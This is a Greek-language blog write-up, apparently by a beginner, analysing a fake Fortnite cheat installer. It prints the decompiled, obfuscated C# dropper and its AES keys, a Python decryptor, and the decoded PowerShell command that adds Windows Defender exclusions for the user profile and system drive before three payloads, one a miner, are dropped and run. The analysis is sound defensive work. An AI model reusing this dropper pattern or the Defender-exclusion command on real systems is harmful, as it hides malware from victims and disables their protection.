---
title: Στα βαθιά
date: 23/11/2025
category: Writeup
description: Δουλειά ντετέκτιβ...
link: --
---
Σε αυτό το άρθρο θα ρίξουμε μια πιο κοντινή και προσεκτική ματιά στο αρχείο που πήραμε από το βίντεο με το fortnite cheats (βλέπε [ΕΔΩ](/articles/hunting_scammers_s01_e01)).

Έχω δημιουργήσει μια Εικονική Μηχανή με Windows 10 ώστε να μπορώ να αναλύω ιούς χωρίς φόβο πως αν πατήσω κάτι λάθος θα κάνω ζημιά στο κύριο σύστημα. Επιπρόσθετα έχω εγκαταστήσει τα εργαλεία που χρειάζονται. 

Είμαι εντελώς αρχάριος σε αυτά οπότε συγχωρήστε τυχόν λάθη. Ας ξεκινήσουμε!

Η σελίδα με τα υποτιθέμενα game cheats λειτουργεί ακόμα οπότε δεν ήταν δύσκολο να ξαναβρώ τα αρχεία. Έχουμε λοιπόν ένα αρχείο zip κλειδωμένο με κωδικό ο οποίος περιέχεται στις πληροφορίες του αρχείου.

Το ανοίγουμε και συναντάμε τα παρακάτω αρχεία.

![Screenshot](/images/sta_vathia_imgs/1.jpg)

Επικεντρωνόμαστε στο αρχείο exe καθώς τα άλλα 3 δεν έχουν τίποτα το σημαντικό. Το cab φαίνεται να είναι corrupted, το install.log περιέχει ψεύτικες πληροφορίες όπως και το setup.ini. Προσπαθούν να πείσουν τον χρήστη πως το cheat πράγματι λειτουργεί. 

Στα σημαντικά τώρα, για να πάρουμε μια γεύση πάμε στις ιδιότητες του αρχείου και έπειτα στις λεπτομέρειες.

![Screenshot](/images/sta_vathia_imgs/2.jpg)

Το όνομα δεν είναι καν Setup.exe αλλά ready.exe (σύμφωνα με το Google Translate). Τουλάχιστον έτσι ξεκίνησε.  Επειδή όμως οι ιδιότητες των  Windows μας δίνουν ελάχιστες πληροφορίες θα χρειαστούμε κάποια εργαλεία. Το πρώτο είναι το "Detect it Easy" το οποίο θα μας δώσει πληροφορίες σχετικά με τη γλώσσα προγραμματισμού του αρχείου, τον συμπιεστή του κ.α. 

![Screenshot](/images/sta_vathia_imgs/3.jpg)

Από εδώ κρατάμε την γλώσσα προγραμματισμού. C#. Πρόκειται για, ίσως, την πιο εύκολη γλώσσα να "σπάσει" κανείς. Περνάμε στο δεύτερο εργαλείο που θα μας βοηθήσει στην ανάλυση, το dnSpy.
Ανοίγοντας λοιπόν το αρχείο συναντάμε τον παρακάτω κώδικα.

```C#
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

namespace wathrvwqbtwwjb
{
	// Token: 0x02000002 RID: 2
	internal class wathrvwqbtwwjb
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static byte[] gzhlhpxfwqkqftwkjkgvainzrbpahtz(byte[] kbtlyzdvhm)
		{
			byte[] result;
			using (Aes aes = Aes.Create())
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(new Rfc2898DeriveBytes("mvkjxbcaewygkqgqawjveaexshcdchkgedlggcllwchviujsqfkymqnmrnrpzzxxkscgdajyjxzbsjnyxjnwwltpqzptkwmxejjrsdppwmpqrlugztsqlbbzymrekrmmkbwiaxguvyziwdxdfitsewldijtemkdfacepqlgclxvmbscuqmycxvhnqszqdchkvuiuzhnucqfhbycrgynzlahevqyxlqyjpkrgiivhzeahpzmsqiifnhyumeyiiqhm", Encoding.ASCII.GetBytes("svsrgvhydfahaapvdghdgtwglxuejlyi"), 100).GetBytes(16), Encoding.ASCII.GetBytes("wnquhvkuakbhhrtl")), CryptoStreamMode.Write))
					{
						cryptoStream.Write(kbtlyzdvhm, 0, kbtlyzdvhm.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000210C File Offset: 0x0000030C
		public static string fluskhqrwyfnnpafraygi(string kbtlyzdvhm)
		{
			return Encoding.UTF8.GetString(wathrvwqbtwwjb.gzhlhpxfwqkqftwkjkgvainzrbpahtz(Convert.FromBase64String(kbtlyzdvhm)));
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002124 File Offset: 0x00000324
		public static void lnpfiitpxipltiwz(string nipmpaiug)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = wathrvwqbtwwjb.fluskhqrwyfnnpafraygi("CBt/pVGeCD4hppd04w+G+Q=="),
				Arguments = nipmpaiug,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			});
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002164 File Offset: 0x00000364
		public static void Main()
		{
			wathrvwqbtwwjb.lnpfiitpxipltiwz(wathrvwqbtwwjb.fluskhqrwyfnnpafraygi("Sor5kLObChITpjColIJkYmgcCDVMLmARa9cAAEX+F8OVxFW/MbWojcV8Pp8ln0d5qwAVDvkqTqmk1rBmUv31Snmo5E3itWjPKJwIbiqQRGsoI48CG8ruZ4UXp6wPTp2BVhk0qsx4TjoGH2+UGhQThChSS6E3GAeahpl/gjQugfSIJlIb8SeMaOkLFkoaUjJYDIMidkdmUhApkZqMa4pPrDtv3hAvxRoGHVfGwZ0Lrfisfjhx+r5rozO7CVvsGXld7az79vIkxiJEueM61XmROJoxHh0roVgqSZdjfIBjDg2dvAg1Wia5Pe3Nf5kVgxTZrsdiH4LCTnmzPVHzX2/ETqP/q3t+cHdDA6l0Aeac4rKonQuP+CqJtaDT3VkQHOrFOikhDCOACTFSF+qxVknEpw=="));
			string[][] array = new string[][]
			{
				new string[]
				{
					"yA5n2d7gKMjQAkEMjbTwuA==",
					"c1bB2tlkPl8IoIgj9niRzw==",
					"zuulirsspclnpfgi",
					"mGneppO5meLjPP3N9aESfA=="
				},
				new string[]
				{
					"baAU4I/wnrTcABM8v+02E5fPAK1AtA8wadt2YwsXwWw=",
					"X+IcOXJfb1nVaIMHNl/a9Jp1RptCPmvoQh+mdkb2qQg=",
					"hischsnjmsyqfyut",
					"mGneppO5meLjPP3N9aESfA=="
				},
				new string[]
				{
					"7+RmwWILpTt9ay0zO+DAcA==",
					"C4jaDb9ZSupoDtDBXWXPbinSJo4YxDmiqF5qH/QyUBg=",
					"illgngmtiinkfefh",
					"mGneppO5meLjPP3N9aESfA=="
				}
			};
			ResourceManager resourceManager = new ResourceManager("kbbdmrtvnaevfvwm", Assembly.GetExecutingAssembly());
			for (int i = 0; i < 3; i++)
			{
				string text = Path.Combine((array[i][0] == "baAU4I/wnrTcABM8v+02E5fPAK1AtA8wadt2YwsXwWw=") ? Directory.GetCurrentDirectory() : Environment.GetEnvironmentVariable(wathrvwqbtwwjb.fluskhqrwyfnnpafraygi(array[i][0])), wathrvwqbtwwjb.fluskhqrwyfnnpafraygi(array[i][1]));
				File.WriteAllBytes(text, wathrvwqbtwwjb.gzhlhpxfwqkqftwkjkgvainzrbpahtz((byte[])resourceManager.GetObject(array[i][2])));
				if (wathrvwqbtwwjb.fluskhqrwyfnnpafraygi(array[i][3]) == wathrvwqbtwwjb.fluskhqrwyfnnpafraygi("mGneppO5meLjPP3N9aESfA=="))
				{
					Process.Start(text);
				}
			}
		}
	}
}

```
Δεν τον λες και εύκολο στην ανάγνωση. Κάποια σημεία δεν είναι ξεκάθαρα. Παρατηρούμε όμως τη λέξη "AES" η οποία αναφέρεται στον αλγόριθμο κρυπτογράφησης. Έχουμε λοιπόν ένα στοιχείο. Συνεχίζουμε.

Ο αλγόριθμος αυτός χρησιμοποιείται για να κρύψει κάποιες μεταβλητές. Όμως, δεν τις κρύβει μόνο. Προδίδει επίσης και τα κλειδιά αποκρυπτογράφησης. 
1) Password: mvkjxbcaewygkqgqawjveaexshcdchkgedlggcllwchviujsqfkymqnmrnrpzzxxkscgdajyjxzbsjnyxjnwwltpqzptkwmxejjrsdppwmpqrlugztsqlbbzymrekrmmkbwiaxguvyziwdxdfitsewldijtemkdfacepqlgclxvmbscuqmycxvhnqszqdchkvuiuzhnucqfhbycrgynzlahevqyxlqyjpkrgiivhzeahpzmsqiifnhyumeyiiqhm
2) svsrgvhydfahaapvdghdgtwglxuejlyi
3) wnquhvkuakbhhrtl

Κάνοντας χρήση αυτών και με κάποια LLM μαγικά οδηγούμαστε στον κώδικα που θα ξετυλίξει το μυστήριο.

```python
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1

# Base64-encoded ciphertext (replace with your actual data)
data_b64 = "PAAjAHcAbQBkACMAPgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAAPAAjAHYAcwBuACMAPgAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEAAKAAkAGUAbgB2ADoAVQBzAGUAcgBQAHIAbwBmAGkAbABlACwAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQApACAAPAAjAHoAdgBlACMAPgAgAC0ARgBvAHIAYwBlACAAPAAjAGgAcQBnACMAPgA="
data = b64decode(data_b64)

password = b"mvkjxbcaewygkqgqawjveaexshcdchkgedlggcllwchviujsqfkymqnmrnrpzzxxkscgdajyjxzbsjnyxjnwwltpqzptkwmxejjrsdppwmpqrlugztsqlbbzymrekrmmkbwiaxguvyziwdxdfitsewldijtemkdfacepqlgclxvmbscuqmycxvhnqszqdchkvuiuzhnucqfhbycrgynzlahevqyxlqyjpkrgiivhzeahpzmsqiifnhyumeyiiqhm"
salt = b"svsrgvhydfahaapvdghdgtwglxuejlyi"
iv = b"wnquhvkuakbhhrtl"

# Derive key using PBKDF2 with SHA-1 and 100 iterations
key = PBKDF2(password, salt, dkLen=16, count=100, hmac_hash_module=SHA1)

# Create AES cipher for CBC mode
cipher = AES.new(key, AES.MODE_CBC, iv)

# Decrypt the data
plaintext = cipher.decrypt(data)

# Unpad assuming PKCS7 padding
pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]

print(plaintext.decode('utf-8'))
```
Δεν έχουμε λοιπόν παρά να αντικαταστήσουμε τα κρυπτογραφημένα κομμάτια στην μεταβλητή "data_b64".

Καταλήγουμε στις παρακάτω λύσεις:

Βασικός κατάλογος Windows. 
```
yA5n2d7gKMjQAkEMjbTwuA== ---> SystemRoot
```

Ένα από τα 3 παράγωγα της εγκατάστασής μας.
```
c1bB2tlkPl8IoIgj9niRzw== ---> 0.exe
```

Απλά η λέξη "αληθής". Χρησιμοποείται σε συνάρτηση στον αρχικό κώδικα
```
mGneppO5meLjPP3N9aESfA== ---> true
```

Ο τρέχον κατάλογος. 
```
baAU4I/wnrTcABM8v+02E5fPAK1AtA8wadt2YwsXwWw= ---> Current Directory
```

Δεύτερο παράγωγο της εγκατάστασης. Μετάφραση: Miner.exe. ΣΧΟΛΙΟ: Μια ακόμα επιβεβαίωση πως το λογισμικό δεν είναι αυτό που λέει.
```
X+IcOXJfb1nVaIMHNl/a9Jp1RptCPmvoQh+mdkb2qQg= ---> майнер.exe
```

Μέρος καταλόγου
```
7+RmwWILpTt9ay0zO+DAcA== ---> AppData
```

Τρίτο παράγωγο της εγκατάστασης. Μετάφραση:Cheat Clean
```
C4jaDb9ZSupoDtDBXWXPbinSJo4YxDmiqF5qH/QyUBg= ---> чит-чистый.exe
```


Εντολή powershell που προσθέτει εξαιρέσεις στον Windows Defender ώστε να μην ελέγξει τους συγκεκριμένους καταλόγους. Να σημειωθεί πως η εντολή είναι διπλά κωδικοποιημένη. Πρώτα με τον AES και στην συνέχεα με Base64 που αποκωδικοποιεί από μόνο του το powershell.

```
CBt/pVGeCD4hppd04w+G+Q== ---> powershell

Sor5kLObChITpjColIJkYmgcCDVMLmARa9cAAEX+F8OVxFW/MbWojcV8Pp8ln0d5qwAVDvkqTqmk1rBmUv31Snmo5E3itWjPKJwIbiqQRGsoI48CG8ruZ4UXp6wPTp2BVhk0qsx4TjoGH2+UGhQThChSS6E3GAeahpl/gjQugfSIJlIb8SeMaOkLFkoaUjJYDIMidkdmUhApkZqMa4pPrDtv3hAvxRoGHVfGwZ0Lrfisfjhx+r5rozO7CVvsGXld7az79vIkxiJEueM61XmROJoxHh0roVgqSZdjfIBjDg2dvAg1Wia5Pe3Nf5kVgxTZrsdiH4LCTnmzPVHzX2/ETqP/q3t+cHdDA6l0Aeac4rKonQuP+CqJtaDT3VkQHOrFOikhDCOACTFSF+qxVknEpw== ---> -EncodedCommand "PAAjAHcAbQBkACMAPgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAAPAAjAHYAcwBuACMAPgAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEAAKAAkAGUAbgB2ADoAVQBzAGUAcgBQAHIAbwBmAGkAbABlACwAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQApACAAPAAjAHoAdgBlACMAPgAgAC0ARgBvAHIAYwBlACAAPAAjAGgAcQBnACMAPgA="
---> # wmd#>Add-MpPreference <#vsn#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#zve#> -Force <#hqg#>
```


Με λίγα λόγια, αυτό που κάνει το Setup.exe είναι να δημιουργεί μια κρυμμένη διεργασία powershell η οποία ουσιαστικά αχρηστεύει τον Defender, στη συνέχεια εξαγάγει τα τρία αρχεία-payloads και στο τέλος τα τρέχει τελειώνοντας τη βρώμικη δουλειά του. 

Μένουν μόνο να ξεκαθαριστούν 3 λέξεις οι οποίες δεν ξεκλειδώθηκαν με τα κλειδιά.
zuulirsspclnpfgi
hischsnjmsyqfyut
illgngmtiinkfefh

Σε περίπτωση που ανακαλύψω τι ρόλο παίζουν απλά θα τροποποιήσω το άρθρο.